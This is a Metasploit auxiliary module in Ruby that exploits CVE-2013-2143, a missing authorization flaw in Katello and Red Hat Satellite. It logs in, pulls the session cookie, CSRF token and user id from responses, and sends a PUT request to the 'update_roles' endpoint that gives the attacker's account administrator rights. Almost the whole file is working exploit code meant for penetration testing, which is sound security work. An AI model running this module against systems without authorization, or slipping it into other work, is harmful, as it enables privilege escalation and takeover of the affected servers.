##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name' => 'Katello (Red Hat Satellite) users/update_roles Missing Authorization',
      'Description' => %q{
          This module exploits a missing authorization vulnerability in the
        "update_roles" action of "users" controller of Katello and Red Hat Satellite
        (Katello 1.5.0-14 and earlier) by changing the specified account to an
        administrator account.
      },
      'Author' => 'Ramon de C Valle',
      'License' => MSF_LICENSE,
      'References' => [
        ['CVE', '2013-2143'],
        ['CWE', '862'],
        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=970849']
      ],
      'DisclosureDate' => 'Mar 24 2014'
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('USERNAME', [true, 'Your username']),
        OptString.new('PASSWORD', [true, 'Your password']),
        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
      ], self.class
    )
  end

  def run
    print_status("Logging into #{target_url}...")
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'user_session', 'new'),
      'vars_get' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    )

    if res.nil?
      print_error('No response from remote host')
      return
    end

    if res.headers['Location'] =~ %r{user_session/new$}
      print_error('Authentication failed')
      return
    else
      session = ::Regexp.last_match(1) if res.get_cookies =~ /_katello_session=(\S*);/

      if session.nil?
        print_error('Failed to retrieve the current session')
        return
      end
    end

    print_status('Retrieving the CSRF token for this session...')
    res = send_request_cgi(
      'cookie' => "_katello_session=#{session}",
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'dashboard')
    )

    if res.nil?
      print_error('No response from remote host')
      return
    end

    if res.headers['Location'] =~ %r{user_session/new$}
      print_error('Authentication failed')
      return
    else
      session = ::Regexp.last_match(1) if res.get_cookies =~ /_katello_session=(\S*);/

      if session.nil?
        print_error('Failed to retrieve the current session')
        return
      end
    end

    if res.headers['Location'] =~ %r{user_session/new$}
      print_error('Failed to retrieve the user id')
      return
    else
      csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(\S*)" +name="csrf-token" */?>}i
      if csrf_token.nil? && (res.body =~ %r{<meta +name="csrf-token" +content="(\S*)" */?>}i)
        csrf_token = ::Regexp.last_match(1)
      end

      if csrf_token.nil?
        print_error('Failed to retrieve the CSRF token')
        return
      end

      user = ::Regexp.last_match(1) if res.body =~ %r{/users.(\d+)#list_search=#{datastore['USERNAME']}}

      if user.nil?
        print_error('Failed to retrieve the user id')
        return
      end
    end

    print_status("Sending update-user request to #{target_url('users', user, 'update_roles')}...")
    res = send_request_cgi(
      'cookie' => "_katello_session=#{session}",
      'headers' => {
        'X-CSRF-Token' => csrf_token
      },
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, 'users', user, 'update_roles'),
      'vars_post' => {
        'user[role_ids][]' => '1'
      }
    )

    if res.nil?
      print_error('No response from remote host')
      return
    end

    if res.headers['X-Message-Type'] =~ /success$/
      print_good('User updated successfully')
    else
      print_error('Failed to update user')
    end
  end

  def target_url(*args)
    (ssl ? 'https' : 'http') +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end
end
